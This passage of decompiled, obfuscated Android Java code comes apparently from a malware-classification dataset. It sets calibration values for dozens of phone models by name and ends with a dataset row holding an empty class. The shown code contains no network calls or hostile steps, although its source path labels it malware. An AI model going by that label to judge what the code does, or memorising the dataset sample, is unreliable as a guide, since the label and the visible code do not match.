  this.d=92.5f;         this.e=1;       }     }  else     if (this.f347a.equals(""IM-A760S"") || this.f347a.equals(""IM-A770K"") || this.f347a.equals(""IM-A775C"")|| this.f347a.equals(""IM-A780L"")|| this.f347a.equals(""Android edition by sfr STARADDICT"")|| this.f347a.equals(""MEDION LIFE P4310"")) {       this.c=93.2f;       if (this.f347a.equals(""IM-A760S"")) {         this.d=90.0f;         this.e=12;         this.f=105;         this.g=0.3f;         this.i=12;         this.j=-27;         this.k=54;         this.l=34;         this.m=50;       }  else       if (this.f347a.equals(""IM-A770K"") || this.f347a.equals(""IM-A775C"") || this.f347a.equals(""IM-A780L"")) {         this.d=91.0f;         this.e=12;         this.f=20;         this.g=0.4f;         this.i=12;         this.j=-27;         this.k=55;         this.l=34;         this.m=53;       }     }  else     if (this.f347a.equals(""X10i"") || this.f347a.equals(""X10a"") || this.f347a.equals(""X10i TripNMiUI"")|| this.f347a.equals(""SO-01B"")|| this.f347a.equals(""SonyEricssonX10a"")|| this.f347a.equals(""SonyEricssonSO-01B"")|| this.f347a.equals(""R800i"")) {       this.c=89.2f;       this.d=91.5f;       this.e=0;       this.f=65;       this.g=0.5f;       this.i=12;       this.j=-18;       this.k=52;       this.l=32;       this.m=0;     }  else     if (this.f347a.equals(""Dell Venue"")) {       this.c=88.8f;       this.d=89.5f;       this.e=5;       this.f=105;       this.g=0.25f;       this.i=10;       this.j=-21;       this.k=53;       this.l=32;       this.m=62;     }  else     if (this.f347a.equals(""T-01C"") || this.f347a.equals(""IS04"") || this.f347a.equals(""IS11T"")|| this.f347a.equals(""N-04C"")|| this.f347a.equals(""N-06C"")|| this.f347a.equals(""F-07D"")|| this.f347a.equals(""P-02D"")|| this.f347a.equals(""MB860"")|| this.f347a.equals(""MB861"")|| this.f347a.equals(""DROID3"")) {       this.c=88.8f;       if (this.f347a.equals(""MB860"") || this.f347a.equals(""MB861"") || this.f347a.equals(""DROID3"")) {         this.d=94.0f;         this.e=2;         this.f=80;         this.g=-0.1f;         this.k=54;         this.l=32;         this.m=30;       }  else {         this.d=92.0f;         this.k=52;         this.l=31;       }     }  else     if (this.f347a.equals(""SHW-M110S"") || this.f347a.equals(""YP-GB1"") || this.f347a.equals(""YP-G1"")|| this.f347a.equals(""GT-I9000"")|| this.f347a.equals(""GT-I9000M"")|| this.f347a.equals(""GT-I9000B"")|| this.f347a.equals(""GT-I9000L"")|| this.f347a.equals(""GT-I9000T"")|| this.f347a.equals(""GT-I9001"")|| this.f347a.equals(""GT-I9010"")|| this.f347a.equals(""SPH-D700"")|| this.f347a.equals(""SCH-R910"")|| this.f347a.equals(""SCH-I500"")|| this.f347a.equals(""SGH-T959"")|| this.f347a.equals(""SGH-T959D"")|| this.f347a.equals(""SGH-T959P"")|| this.f347a.equals(""SGH-T959V"")|| this.f347a.equals(""SGH-I897"")|| this.f347a.equals(""SAMSUNG-SGH-I897"")|| this.f347a.equals(""SAMSUNG-SGH-I896"")|| this.f347a.equals(""SC-02B"")|| this.f347a.equals(""GT-I9003"")|| this.f347a.equals(""GT-I9003L"")|| this.f347a.equals(""SHW-M190S"")|| this.f347a.equals(""SHW-M340S"")|| this.f347a.equals(""SHW-M340K"")|| this.f347a.equals(""SHW-M340L"")) {       this.c=86.5f;       this.d=88.5f;       this.e=6;       this.f=120;       this.g=0.3f;       this.i=4;       this.k=55;       this.l=34;       this.m=11;       if (this.f347a.equals(""SHW-M190S"")) {         this.d=87.0f;         this.e=6;         this.f=120;         this.g=0.5f;         this.i=14;         this.j=-24;         this.k=52;         this.l=32;         this.m=11;       }     }  else     if (this.f347a.equals(""LG-SU660"") || this.f347a.equals(""LG-P990"") || this.f347a.equals(""LG-P990h"")|| this.f347a.equals(""LG-P999"")|| this.f347a.equals(""Optimus 2X"")|| this.f347a.equals(""LG-SU880"")|| this.f347a.equals(""LG-KU8800"")|| this.f347a.equals(""LG-LU6500"")|| this.f347a.equals(""LG-KU5900"")|| this.f347a.equals(""LG-P970"")|| this.f347a.equals(""LG-P970h"")) {       this.c=86.5f;       if (this.f347a.equals(""LG-SU660"") || this.f347a.equals(""LG-P990"") || this.f347a.equals(""LG-P990h"")|| this.f347a.equals(""LG-P999"")|| this.f347a.equals(""Optimus 2X"")|| this.f347a.equals(""LG-LU6500"")) {         this.d=88.5f;         this.e=5;         this.f=180;         this.g=0.1f;         this.i=8;         this.j=-24;         this.k=54;         this.l=34;         this.m=42;       }  else       if (this.f347a.equals(""LG-SU880"") || this.f347a.equals(""LG-KU8800"")) {         this.d=88.5f;         this.e=5;         this.f=50;         this.g=-0.6f;         this.i=12;         this.j=-24;         this.k=50;         this.l=29;         this.m=42;         this.n=false;       }  else       if (this.f347a.equals(""LG-KU5900"") || this.f347a.equals(""LG-P970"") || this.f347a.equals(""LG-P970h"")) {         this.d=89.5f;         this.e=3;         this.f=90;         this.g=0.1f;         this.i=8;         this.j=-24;         this.k=50;         this.l=32;         this.m=43;       }     }  else     if (this.f347a.equals(""Nexus S"") || this.f347a.equals(""Google Nexus S"") || this.f347a.equals(""Nexus S 4G"")|| this.f347a.equals(""HTC Incredible S"")|| this.f347a.equals(""ADR6350"")|| this.f347a.equals(""IM-A710K"")|| this.f347a.equals(""IM-A720L"")|| this.f347a.equals(""IM-A725L"")|| this.f347a.equals(""IM-A730S"")|| this.f347a.equals(""ADR8995"")|| this.f347a.equals(""SK-S150"")|| this.f347a.equals(""KM-S220"")|| this.f347a.equals(""KM-S220H"")|| this.f347a.equals(""Skate Aqua"")|| this.f347a.equals(""N-01D"")|| this.f347a.equals(""ISW11K"")) {       this.c=86.5f;       if (this.f347a.equals(""Nexus S"") || this.f347a.equals(""Google Nexus S"") || this.f347a.equals(""Nexus S 4G"")) {         this.d=91.5f;         this.e=0;         this.f=80;         this.g=0.15f;         this.i=16;         this.j=-45;         this.k=57;         this.l=40;         this.m=0;       }  else       if (this.f347a.equals(""HTC Incredible S"") || this.f347a.equals(""ADR6350"")) {         this.d=89.0f;         this.e=1;         this.f=85;         this.g=0.3f;         this.i=13;         this.j=-21;         this.k=50;         this.l=31;         this.m=20;       }  else       if (this.f347a.equals(""IM-A710K"") || this.f347a.equals(""IM-A720L"") || this.f347a.equals(""IM-A725L"")) {         this.d=89.5f;         this.e=12;         this.f=100;         this.g=0.6f;         this.i=12;         this.j=-27;         this.k=55;         this.l=34;         this.m=50;       }  else       if (this.f347a.equals(""IM-A730S"") || this.f347a.equals(""ADR8995"")) {         this.d=89.0f;         this.e=12;         this.i=10;         this.j=-27;         this.k=54;         this.l=34;         this.m=50;       }  else       if (this.f347a.equals(""SK-S150"")) {         this.d=93.5f;         this.e=1;         this.f=100;         this.g=0.3f;         this.i=10;         this.j=-21;         this.k=54;         this.l=33;         this.m=64;       }  else       if (this.f347a.equals(""KM-S220"") || this.f347a.equals(""KM-S220H"")) {         this.d=90.0f;         this.e=11;         this.f=120;         this.g=-0.2f;         this.i=13;         this.j=-30;         this.k=55;         this.l=34;         this.m=63;       }     }  else     if (this.f347a.equals(""EV-S100"") || this.f347a.equals(""LG-LU3000"") || this.f347a.equals(""LG-E730"")|| this.f347a.equals(""LG-E739"")|| this.f347a.equals(""HTC Glacier"")|| this.f347a.equals(""Mytouch_4G"")|| this.f347a.equals(""HTC Panache"")|| this.f347a.equals(""HTC LEXIKON"")|| this.f347a.equals(""SBM003SH"")|| this.f347a.equals(""SBM005SH"")|| this.f347a.equals(""SH-03C"")|| this.f347a.equals(""DM009SH"")|| this.f347a.equals(""u8800"")|| this.f347a.equals(""IDEOS X5"")) {       this.c=82.3f;       if (this.f347a.equals(""HTC Glacier"") || this.f347a.equals(""Mytouch_4G"") || this.f347a.equals(""HTC Panache"")|| this.f347a.equals(""HTC LEXIKON"")) {         this.d=89.0f;         this.e=1;         this.f=140;         this.g=0.15f;         this.i=8;         this.j=-15;         this.k=55;         this.l=34;         this.m=20;       }  else       if (this.f347a.equals(""LG-LU3000"") || this.f347a.equals(""LG-E730"") || this.f347a.equals(""LG-E739"")) {         this.d=91.5f;         this.e=3;         this.f=100;         this.g=0.3f;         this.i=9;         this.j=-15;         this.k=53;         this.l=31;         this.m=43;       }  else       if (this.f347a.equals(""EV-S100"")) {         this.d=90.0f;         this.e=11;         this.f=100;         this.g=0.4f;         this.i=10;         this.j=-24;         this.k=52;         this.l=32;         this.m=63;       }     }  else     if (this.f347a.equals(""XT720"") || this.f347a.equals(""Milestone XT720"") || this.f347a.equals(""Milestone"")|| this.f347a.equals(""A853"")|| this.f347a.equals(""A854"")|| this.f347a.equals(""A855"")|| this.f347a.equals(""A953"")|| this.f347a.equals(""MotoA953"")|| this.f347a.equals(""DROID2"")|| this.f347a.equals(""DROID2 GLOBAL"")|| this.f347a.equals(""Droid"")|| this.f347a.equals(""XT800W"")|| this.f347a.equals(""XT800C"")|| this.f347a.equals(""MB525"")|| this.f347a.equals(""MB526"")|| this.f347a.equals(""MB520"")|| this.f347a.equals(""MT15i"")|| this.f347a.equals(""MT15a"")|| this.f347a.equals(""MT11i"")|| this.f347a.equals(""MK16i"")|| this.f347a.equals(""SHX11"")|| this.f347a.equals(""SH-13C"")|| this.f347a.equals(""SH-02D"")) {       this.c=81.3f;       if (this.f347a.equals(""XT720"") || this.f347a.equals(""Milestone XT720"")) {         this.d=90.0f;         this.e=1;         this.f=45;         this.g=0.2f;         this.k=48;         this.l=29;         this.m=30;         this.n=false;       }  else       if (this.f347a.equals(""XT800W"") || this.f347a.equals(""XT800C"")) {         this.d=90.0f;         this.e=1;         this.f=45;         this.g=0.1f;         this.i=-2;         this.j=0;         this.k=56;         this.l=33;         this.m=30;       }  else       if (this.f347a.equals(""MB525"") || this.f347a.equals(""MB526"") || this.f347a.equals(""MB520"")) {         this.d=90.5f;         this.e=1;         this.f=65;         this.g=0.1f;         this.i=0;         this.j=0;         this.k=50;         this.l=30;         this.m=31;       }  else       if (this.f347a.equals(""MT15i"") || this.f347a.equals(""MT15a"") || this.f347a.equals(""MT11i"")|| this.f347a.equals(""MK16i"")) {         this.d=89.5f;         this.f=65;         this.g=0.5f;         this.i=12;         this.j=-18;         this.k=52;         this.l=31;       }  else       if (this.f347a.equals(""SHX11"") || this.f347a.equals(""SH-13C"") || this.f347a.equals(""SH-02D"")) {         this.k=52;         this.l=31;       }  else {         this.d=89.5f;         this.e=1;         this.f=45;         this.g=0.2f;         this.i=-2;         this.j=0;         this.k=56;         this.l=33;         this.m=30;       }     }  else     if (this.f347a.equals(""Nexus One"") || this.f347a.equals(""HTC Desire"") || this.f347a.equals(""X06HT"")|| this.f347a.equals(""HTC Desire S"")|| this.f347a.equals(""T-Mobile G2"")|| this.f347a.equals(""HTC Desire Z"")|| this.f347a.equals(""HTC Vision"")|| this.f347a.equals(""PB99400"")|| this.f347a.equals(""ADR6300"")|| this.f347a.equals(""HTC Bravo"")|| this.f347a.equals(""PG06100"")|| this.f347a.equals(""Stream"")|| this.f347a.equals(""F-12C"")|| this.f347a.equals(""F-03D"")|| this.f347a.equals(""SKY IM-A600S"")|| this.f347a.equals(""SKY IM-A650S"")|| this.f347a.equals(""IS06"")|| this.f347a.equals(""IS11PT"")) {       this.c=80.8f;       if (this.f347a.equals(""SKY IM-A600S"")) {         this.d=90.0f;         this.e=12;         this.f=85;         this.g=0.45f;         this.i=10;         this.j=-12;         this.k=55;         this.l=34;         this.m=51;       }  else       if (this.f347a.equals(""SKY IM-A650S"") || this.f347a.equals(""IS06"") || this.f347a.equals(""IS11PT"")) {         this.d=92.5f;         this.e=12;         this.f=95;         this.g=0.7f;         this.i=13;         this.j=-27;         this.k=53;         this.l=33;         this.m=50;       }  else       if (!this.f347a.equals(""Stream"") && !this.f347a.equals(""F-12C"") && !this.f347a.equals(""F-03D"")) {         if (this.f347a.equals(""Nexus One"")) {           this.d=89.5f;           this.e=2;           this.f=15;           this.g=0.3f;           this.i=10;           this.j=-15;           this.k=53;           this.l=32;           this.m=22;         }  else {           this.d=89.5f;           this.e=1;           this.f=160;           this.g=0.15f;           this.i=8;           this.j=-18;           this.k=55;           this.l=34;           this.m=21;         }       }     }  else     if (this.f347a.equals(""SHW-M100S"") || this.f347a.equals(""SHW-M130L"") || this.f347a.equals(""SHW-M130K"")|| this.f347a.equals(""GT-I8150"")|| this.f347a.equals(""GT-I815B"")|| this.f347a.equals(""SGH-T679"")|| this.f347a.equals(""SGH-T679M"")) {       this.c=80.2f;       if (this.f347a.equals(""SHW-M100S"")) {         this.d=87.5f;         this.e=2;         this.f=40;         this.g=-0.25f;         this.i=17;         this.j=-50;         this.k=55;         this.l=34;         this.m=17;         this.n=false;       }  else {         this.d=90.5f;         this.e=2;         this.f=120;         this.g=0.25f;         this.i=10;         this.j=-35;         this.k=48;         this.l=29;         this.m=17;       }     }  else     if (this.f347a.equals(""IS11CA"") || this.f347a.equals(""C771"")) {       this.c=78.5f;       this.d=92.5f;     }  else     if (this.f347a.equals(""GT-S5690"")) {       this.c=77.0f;       this.d=90.0f;       this.e=2;       this.f=110;       this.g=0.2f;       this.i=15;       this.j=-30;       this.k=54;       this.l=37;       this.m=15;     }  else     if (this.f347a.equals(""LU2300"") || this.f347a.equals(""LG-C710h"") || this.f347a.equals(""SU950"")|| this.f347a.equals(""KU9500"")|| this.f347a.equals(""SHW-M220L"")|| this.f347a.equals(""SK-S100"")|| this.f347a.equals(""IM-A690S"")|| this.f347a.equals(""IM-A690L"")|| this.f347a.equals(""KM-S120"")|| this.f347a.equals(""Liquid"")|| this.f347a.equals(""Zio"")|| this.f347a.equals(""003Z"")|| this.f347a.equals(""Blade"")|| this.f347a.equals(""ZTE Blade"")|| this.f347a.equals(""ZTE-BLADE"")|| this.f347a.equals(""BASE Lutea 2"")|| this.f347a.equals(""Blade S"")|| this.f347a.equals(""Orange San Francisco"")|| this.f347a.equals(""XCD 35"")) {       this.c=75.7f;       this.k=55;       this.l=34;       if (this.f347a.equals(""LU2300"") || this.f347a.equals(""LG-C710h"")) {         this.d=88.5f;         this.f=TransportMediator.KEYCODE_MEDIA_RECORD;         this.g=0.3f;         this.i=8;         this.j=-6;         this.m=44;       }  else       if (this.f347a.equals(""SU950"") || this.f347a.equals(""KU9500"")) {         this.d=90.5f;         this.e=2;         this.f=TransportMediator.KEYCODE_MEDIA_RECORD;         this.g=0.3f;         this.i=8;         this.j=-6;         this.m=44;       }  else       if (this.f347a.equals(""SHW-M220L"")) {         this.d=88.5f;         this.e=6;         this.f=120;         this.g=0.3f;         this.i=4;         this.m=11;       }  else       if (this.f347a.equals(""SK-S100"")) {         this.d=89.5f;         this.e=1;         this.i=10;         this.j=-21;         this.m=64;       }  else       if (this.f347a.equals(""IM-A690S"") || this.f347a.equals(""IM-A690L"")) {         this.d=90.0f;         this.e=12;         this.i=11;         this.j=-27;         this.m=51;       }  else       if (this.f347a.equals(""Blade S"")) {         this.n=false;       }     }  else     if (this.f347a.equals(""IS03"") || this.f347a.equals(""IS05"") || this.f347a.equals(""SCH-I400"")|| this.f347a.equals(""meizu_m9"")) {       this.c=74.0f;     }  else     if (this.f347a.equals(""SHW-M240S"") || this.f347a.equals(""SHW-M240K"") || this.f347a.equals(""GT-S5830"")|| this.f347a.equals(""GT-S5830B"")|| this.f347a.equals(""GT-S5830L"")|| this.f347a.equals(""GT-S5830T"")|| this.f347a.equals(""SCH-I579"")|| this.f347a.equals(""GT-S5830i"")|| this.f347a.equals(""SPH-M920"")|| this.f347a.equals(""SGH-T839"")|| this.f347a.equals(""SCH-R720"")|| this.f347a.equals(""IM-A740S"")|| this.f347a.equals(""IM-A750K"")|| this.f347a.equals(""LG-E510"")|| this.f347a.equals(""Pulse"")|| this.f347a.equals(""Garmin-Asus A50"")|| this.f347a.equals(""XT530"")|| this.f347a.equals(""XT531"")|| this.f347a.equals(""ALCATEL_one_touch_990"")|| this.f347a.equals(""HUAWEI-M860"")|| this.f347a.equals(""M860"")|| this.f347a.equals(""U8650"")|| this.f347a.equals(""SONIC"")) {       this.c=73.5f;       this.k=54;       this.l=37;       if (this.f347a.equals(""SHW-M240S"") || this.f347a.equals(""SHW-M240K"") || this.f347a.equals(""GT-S5830"")|| this.f347a.equals(""GT-S5830B"")|| this.f347a.equals(""GT-S5830L"")|| this.f347a.equals(""GT-S5830T"")|| this.f347a.equals(""SCH-I579"")|| this.f347a.equals(""GT-S5830i"")|| this.f347a.equals(""SPH-M920"")|| this.f347a.equals(""SGH-T839"")|| this.f347a.equals(""SCH-R720"")) {         this.d=90.0f;         this.e=2;         this.f=110;         this.g=0.2f;         this.i=15;         this.j=-30;         this.k=54;         this.l=37;         this.m=15;       }  else       if (this.f347a.equals(""IM-A740S"") || this.f347a.equals(""IM-A750K"")) {         this.d=91.5f;         this.e=12;         this.i=11;         this.j=-24;         this.k=54;         this.l=37;         this.m=52;       }  else       if (this.f347a.equals(""XT530"") || this.f347a.equals(""XT531"")) {         this.n=false;       }     }  else     if (this.f347a.equals(""SO-03C"") || this.f347a.equals(""ST18i"") || this.f347a.equals(""ST18a"")) {       this.c=73.0f;       this.d=89.5f;       this.f=65;       this.g=0.5f;       this.i=12;       this.j=-18;       this.k=52;       this.l=31;       this.m=0;     }  else     if (this.f347a.equals(""T-Mobile myTouch 3G Slide"")) {       this.c=72.0f;       this.d=89.0f;       this.f=140;       this.g=0.15f;       this.i=8;       this.j=-15;       this.l=38;       this.m=20;     }  else     if (this.f347a.equals(""SKY IM-A630K"") || this.f347a.equals(""Ally"") || this.f347a.equals(""US740"")|| this.f347a.equals(""P-01D"")|| this.f347a.equals(""A32"")|| this.f347a.equals(""Vodafone 945"")|| this.f347a.equals(""GSmart G1317D"")|| this.f347a.equals(""SPH-M910"")|| this.f347a.equals(""GT-I5510"")|| this.f347a.equals(""GT-I5510L"")|| this.f347a.equals(""GT-I5510M"")|| this.f347a.equals(""GT-I5510T"")|| this.f347a.equals(""GT-I5800"")|| this.f347a.equals(""GT-I5800D"")|| this.f347a.equals(""GT-I5800L"")|| this.f347a.equals(""GT-I5801"")|| this.f347a.equals(""SCH-I100"")|| this.f347a.equals(""YP-G50"")) {       this.c=69.0f;       if (this.f347a.equals(""SKY IM-A630K"")) {         this.d=91.0f;         this.e=11;         this.i=12;         this.j=-30;         this.k=52;         this.l=33;         this.m=52;         this.n=false;       }  else       if (this.f347a.equals(""Ally"") || this.f347a.equals(""US740"")) {         this.e=12;       }  else       if (!this.f347a.equals(""P-01D"") && !this.f347a.equals(""A32"") && !this.f347a.equals(""Vodafone 945"")&& !this.f347a.equals(""GSmart G1317D"")) {         this.f=120;         this.g=0.3f;         this.i=4;         this.m=15;       }     }  else     if (this.f347a.equals(""LG-SU370"") || this.f347a.equals(""LG-LU3700"") || this.f347a.equals(""LG-KU3700"")|| this.f347a.equals(""LG-P500"")|| this.f347a.equals(""LG-P500h"")|| this.f347a.equals(""L-04C"")|| this.f347a.equals(""Vortex"")|| this.f347a.equals(""LG-E720b"")|| this.f347a.equals(""LS670"")|| this.f347a.equals(""LG-P509"")|| this.f347a.equals(""LG-LU3100"")|| this.f347a.equals(""LG-MS690"")|| this.f347a.equals(""VM670"")|| this.f347a.equals(""LGL55C"")|| this.f347a.equals(""LGL45C"")) {       this.c=68.0f;       this.d=91.5f;       this.e=9;       this.i=12;       this.j=-18;       this.k=54;       this.l=38;       this.m=41;     }  else     if (this.f347a.equals(""HTC Legend"") || this.f347a.equals(""HTC Hero"") || this.f347a.equals(""Hero"")|| this.f347a.equals(""HERO200"")|| this.f347a.equals(""T-Mobile G1"")|| this.f347a.equals(""HTC Dream"")|| this.f347a.equals(""HTC Liberty"")|| this.f347a.equals(""HTC Aria"")|| this.f347a.equals(""HTC Aria A6380"")|| this.f347a.equals(""Eris"")|| this.f347a.equals(""HTC Gratia A6380"")|| this.f347a.equals(""HTC Wildfire S A510e"")|| this.f347a.equals(""HTC Explorer A310e"")|| this.f347a.equals(""HTC Magic"")|| this.f347a.equals(""HT-03A"")|| this.f347a.equals(""Docomo HT-03A"")|| this.f347a.equals(""DoCoMo HT-03A"")) {       this.c=67.6f;       this.d=89.5f;       this.e=1;       this.f=145;       this.g=0.15f;       this.i=10;       this.j=-18;       this.k=54;       this.l=37;       this.m=20;     }  else     if (this.f347a.equals(""SHW-M290S"") || this.f347a.equals(""SHW-M290K"") || this.f347a.equals(""GT-S5660"")|| this.f347a.equals(""GT-S5660B"")|| this.f347a.equals(""GT-S5660L"")|| this.f347a.equals(""GT-S5660M"")|| this.f347a.equals(""SCH-i569"")|| this.f347a.equals(""GT-I5700"")|| this.f347a.equals(""GT-I5700L"")|| this.f347a.equals(""SPH-M900"")|| this.f347a.equals(""SCH-R880"")|| this.f347a.equals(""SGH-T939"")|| this.f347a.equals(""SPH-M820"")|| this.f347a.equals(""SPH-M820-BST"")|| this.f347a.equals(""SGH-T589"")) {       this.c=67.6f;       this.d=87.5f;       this.e=12;       this.f=110;       this.g=0.2f;       this.i=15;       this.j=-35;       this.k=51;       this.l=35;       this.m=16;     }  else     if (this.f347a.equals(""Garmin-Asus A10"") || this.f347a.equals(""WT19i"") || this.f347a.equals(""EV-S110"")|| this.f347a.equals(""E310"")|| this.f347a.equals(""Boston"")|| this.f347a.equals(""Orange_Boston"")|| this.f347a.equals(""GSmart G1310"")|| this.f347a.equals(""U8500"")) {       this.c=67.6f;       this.l=38;       if (this.f347a.equals(""WT19i"")) {         this.f=90;         this.g=0.7f;       }     }  else     if (this.f347a.equals(""GT-S5670"") || this.f347a.equals(""GT-S5670L"")) {       this.c=67.0f;       this.e=12;       this.f=120;       this.g=0.3f;       this.i=4;       this.k=53;       this.l=42;       this.m=15;     }  else     if (this.f347a.equals(""Devour"") || this.f347a.equals(""MB200"") || this.f347a.equals(""MB501"")|| this.f347a.equals(""PantechP8000"")) {       this.c=66.0f;       if (this.f347a.equals(""PantechP8000"")) {         this.d=91.5f;         this.e=12;         this.i=11;         this.j=-24;         this.k=54;         this.l=37;         this.m=52;       }  else {         this.d=87.0f;         this.f=45;         this.g=0.2f;         this.i=-2;         this.j=0;         this.k=54;         this.m=30;         this.n=false;       }     }  else     if (this.f347a.equals(""HTC Wildfire"") || this.f347a.equals(""HTC Bee"") || this.f347a.equals(""HTC Buzz"")|| this.f347a.equals(""GT-S5570"")|| this.f347a.equals(""GT-S5570B"")|| this.f347a.equals(""GT-S5570L"")|| this.f347a.equals(""SGH-T499"")) {       this.c=64.7f;       this.k=53;       this.l=42;       if (this.f347a.equals(""GT-S5570"") || this.f347a.equals(""GT-S5570B"") || this.f347a.equals(""GT-S5570L"")|| this.f347a.equals(""SGH-T499"")) {         this.f=120;         this.g=0.3f;         this.i=4;         this.m=15;       }  else {         this.d=90.5f;         this.e=1;         this.f=145;         this.g=0.15f;         this.i=8;         this.j=-15;         this.m=20;       }     }  else     if (this.f347a.equals(""X8"") || this.f347a.equals(""E15i"") || this.f347a.equals(""E15a"")|| this.f347a.equals(""ST15i"")|| this.f347a.equals(""SK17i"")|| this.f347a.equals(""GT540"")|| this.f347a.equals(""LG KH5200"")|| this.f347a.equals(""LG-KH5200"")|| this.f347a.equals(""GW620"")) {       this.c=63.5f;       this.k=48;       this.l=32;       if (this.f347a.equals(""X8"") || this.f347a.equals(""E15i"") || this.f347a.equals(""E15a"")) {         this.d=86.5f;       }  else       if (this.f347a.equals(""ST15i"") || this.f347a.equals(""SK17i"")) {         this.d=89.5f;       }  else {         this.d=89.5f;         this.e=2;         this.i=8;         this.j=-9;         this.m=64;         this.n=false;       }     }  else     if (this.f347a.equals(""XT300"") || this.f347a.equals(""WX445"") || this.f347a.equals(""GT-S5360"")|| this.f347a.equals(""GT-S5360B"")) {       this.c=61.0f;       this.k=54;       this.l=43;       this.m=30;       if (this.f347a.equals(""GT-S5360"") || this.f347a.equals(""GT-S5360B"")) {         this.f=110;         this.g=0.2f;         this.m=15;       }     }  else     if (this.f347a.equals(""GT-I5503"") || this.f347a.equals(""GT-I5503T"") || this.f347a.equals(""GT-I5500"")|| this.f347a.equals(""GT-I5500M"")|| this.f347a.equals(""GT-I5500B"")|| this.f347a.equals(""GT-I5500L"")|| this.f347a.equals(""Galaxy5"")|| this.f347a.equals(""GT-B7510"")|| this.f347a.equals(""GT-B7510L"")|| this.f347a.equals(""SPH-M580"")|| this.f347a.equals(""LG-P350"")|| this.f347a.equals(""LG-P350f"")|| this.f347a.equals(""LG-P350g"")|| this.f347a.equals(""MotoMB511"")|| this.f347a.equals(""MB502"")|| this.f347a.equals(""HTC Tattoo"")|| this.f347a.equals(""Ideos"")|| this.f347a.equals(""Comet"")|| this.f347a.equals(""Vodafone 858"")|| this.f347a.equals(""MOVE"")|| this.f347a.equals(""XCD 28"")|| this.f347a.equals(""ZTE-RACER"")|| this.f347a.equals(""MTC 916"")) {       this.c=57.0f;       this.k=54;       this.l=43;       if (this.f347a.equals(""GT-I5503"") || this.f347a.equals(""GT-I5503T"") || this.f347a.equals(""GT-I5500"")|| this.f347a.equals(""GT-I5500M"")|| this.f347a.equals(""GT-I5500B"")|| this.f347a.equals(""GT-I5500L"")|| this.f347a.equals(""Galaxy5"")|| this.f347a.equals(""SPH-M580"")) {         this.e=2;         this.f=110;         this.g=0.2f;         this.i=15;         this.j=-30;         this.m=15;       }       if (this.f347a.equals(""GT-B7510"") || this.f347a.equals(""GT-B7510L"")) {         this.d=91.5f;         this.e=2;         this.f=120;         this.g=0.3f;         this.i=15;         this.j=-30;         this.m=15;       }  else       if (this.f347a.equals(""HTC Tattoo"")) {         this.d=91.0f;         this.e=1;         this.f=145;         this.g=0.15f;         this.i=8;         this.j=-15;         this.m=20;       }     }  else     if (this.f347a.equals(""HTC ChaCha A810e"")) {       this.c=55.0f;     }  else     if (this.f347a.equals(""E10i"") || this.f347a.equals(""E10a"") || this.f347a.equals(""U20i"")|| this.f347a.equals(""U20a"")|| this.f347a.equals(""U8350"")) {       this.c=52.0f;       if (!this.f347a.equals(""U8350"")) {         this.d=89.0f;         this.e=0;         this.i=10;         this.j=-15;         this.k=54;         this.l=43;         this.m=0;       }     }  else {       this.c=-1.0f;     }     if (this.f347a.equals(""GT-I9001"") || this.f347a.equals(""Ally"") || this.f347a.equals(""US740"")|| this.f347a.equals(""LG-SU370"")|| this.f347a.equals(""LG-LU3700"")|| this.f347a.equals(""LG-KU3700"")|| this.f347a.equals(""LG-P500"")|| this.f347a.equals(""LG-P500h"")|| this.f347a.equals(""L-04C"")|| this.f347a.equals(""Vortex"")|| this.f347a.equals(""LG-E720b"")|| this.f347a.equals(""LS670"")|| this.f347a.equals(""LG-P509"")|| this.f347a.equals(""LG-LU3100"")|| this.f347a.equals(""LG-MS690"")|| this.f347a.equals(""VM670"")|| this.f347a.equals(""LGL55C"")|| this.f347a.equals(""LGL45C"")|| this.f347a.equals(""GT540"")|| this.f347a.equals(""LG KH5200"")|| this.f347a.equals(""LG-KH5200"")|| this.f347a.equals(""GW620"")|| this.f347a.equals(""LG-P350"")|| this.f347a.equals(""LG-P350f"")|| this.f347a.equals(""LG-P350g"")|| this.f347a.equals(""IM-A730S"")|| this.f347a.equals(""ADR8995"")|| this.f347a.equals(""IM-A690S"")|| this.f347a.equals(""IM-A690L"")|| this.f347a.equals(""IM-A740S"")|| this.f347a.equals(""IM-A750K"")|| this.f347a.equals(""SKY IM-A630K"")|| this.f347a.equals(""PantechP8000"")|| this.f347a.equals(""X8"")|| this.f347a.equals(""E15i"")|| this.f347a.equals(""E15a"")|| this.f347a.equals(""E10i"")|| this.f347a.equals(""E10a"")|| this.f347a.equals(""U20i"")|| this.f347a.equals(""U20a"")|| this.f347a.equals(""Skate Aqua"")|| this.f347a.equals(""003Z"")|| this.f347a.equals(""Blade"")|| this.f347a.equals(""ZTE Blade"")|| this.f347a.equals(""ZTE-BLADE"")|| this.f347a.equals(""BASE Lutea 2"")|| this.f347a.equals(""Blade S"")|| this.f347a.equals(""Orange San Francisco"")|| this.f347a.equals(""XCD 35"")|| this.f347a.equals(""XCD 28"")|| this.f347a.equals(""ZTE-RACER"")|| this.f347a.equals(""MTC 916"")|| this.f347a.equals(""N-04C"")|| this.f347a.equals(""N-06C"")|| this.f347a.equals(""N-01D"")|| this.f347a.equals(""IS11CA"")|| this.f347a.equals(""C771"")|| this.f347a.equals(""ALCATEL_one_touch_990"")|| this.f347a.equals(""MOVE"")|| this.f347a.equals(""MEDION LIFE P4310"")|| this.f347a.equals(""ISW11K"")|| this.f347a.equals(""SK-S100"")) {       this.h=false;     }   }   public float a(){     return (this.c <= 75.0f || this.c >= 150.0f || Build.VERSION.SDK_INT < 14) ? this.c : this.c - 6.5f;   }   public boolean b(){     int max=Math.max(this.f348b.getResources().getDisplayMetrics().widthPixels,this.f348b.getResources().getDisplayMetrics().heightPixels);     int i=this.f348b.getResources().getDisplayMetrics().densityDpi;     if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT <= 13) {       return true;     }     if (Build.VERSION.SDK_INT >= 14) {       if (this.c > 150.0f) {         return true;       }       if (this.c <= 0.0f && max >= 1280 && i <= 160) {         return true;       }     }     return this.f347a.equals(""GT-B7510"") || this.f347a.equals(""GT-B7510L"") || this.f347a.equals(""U8350"");   }   public float c(){     return this.d;   }   public int d(){     return this.e;   }   public int e(){     if (this.f <= 0 || this.g == 0.0f) {       return -1;     }     return this.f;   }   public float f(){     return this.g;   }   public int g(){     return this.i;   }   public int h(){     return this.j;   }   public boolean i(){     return this.h;   }   public int j(){     return this.k;   }   public int k(){     return this.l;   }   public int l(){     return this.m;   }   public boolean m(){     return this.n;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ae.code","public final class ae { } "
